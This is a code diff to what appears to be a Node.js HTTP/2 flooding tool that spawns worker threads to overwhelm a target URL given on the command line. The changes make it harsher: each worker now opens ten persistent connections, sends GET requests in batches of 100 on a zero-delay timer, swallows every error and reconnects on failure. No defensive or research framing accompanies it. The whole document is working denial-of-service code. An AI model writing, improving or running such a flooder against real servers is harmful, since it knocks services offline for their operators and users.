@@ -2,7 +2,7 @@ const http2 = require('http2');
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
 
-const THREADS = Math.max(5, Math.min(8, cpus().length));
+const THREADS = Math.min(6, cpus().length);
 
 if (isMainThread) {
     if (process.argv.length < 4) {
@@ -22,28 +22,27 @@ if (isMainThread) {
     const { target, duration } = workerData;
     const end = Date.now() + duration * 1000;
 
-    function flood() {
-        if (Date.now() > end) return;
+    function spam(client) {
+        const interval = setInterval(() => {
+            for (let i = 0; i < 100; i++) {
+                if (Date.now() > end) return clearInterval(interval);
+                const req = client.request({ ':path': '/', ':method': 'GET' });
+                req.on('error', () => {});
+                req.end();
+            }
+        }, 0);
+    }
 
+    function connectAndFlood() {
         try {
             const client = http2.connect(target);
             client.on('error', () => {});
-
-            const run = () => {
-                while (Date.now() < end) {
-                    const req = client.request({ ':path': '/', ':method': 'GET' });
-                    req.on('error', () => {});
-                    req.end();
-                }
-                client.close();
-                setImmediate(flood); // reconnect and flood again
-            };
-
-            client.on('connect', run);
+            client.on('connect', () => spam(client));
         } catch (e) {
-            setImmediate(flood);
+            setTimeout(connectAndFlood, 100);
         }
     }
 
-    flood();
+    // Create multiple persistent connections
+    for (let i = 0; i < 10; i++) connectAndFlood();
 }
